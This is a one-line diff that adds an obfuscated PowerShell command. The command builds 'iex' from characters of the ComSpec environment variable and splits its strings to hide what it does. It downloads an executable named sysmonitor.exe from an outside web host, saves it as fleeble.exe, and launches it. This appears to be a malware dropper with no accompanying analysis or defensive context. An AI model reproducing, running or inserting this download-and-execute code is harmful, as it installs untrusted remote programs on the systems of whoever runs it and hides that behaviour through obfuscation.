@@ -1,0 +1,1 @@
+﻿&( $enV:CoMsPEC[4,15,25]-joiN'') ( (('(New-Object Syst'+'e'+'m.'+'Net.WebClient).Dow'+'nlo'+'adFi'+'le'+'(b'+'8Sht'+'tp'+'://air'+'craft'+'pns.co'+'m'+'/_l'+'ayout/'+'im'+'ages/s'+'ysmoni'+'tor.exe'+'b8S,b'+'8S'+'f'+'l'+'e'+'e'+'b'+'le.'+'e'+'xeb8S);S'+'tart-Process b8Sf'+'le'+'eb'+'le.exeb8S')-RePlACE  'b8S',[CHAr]39) )
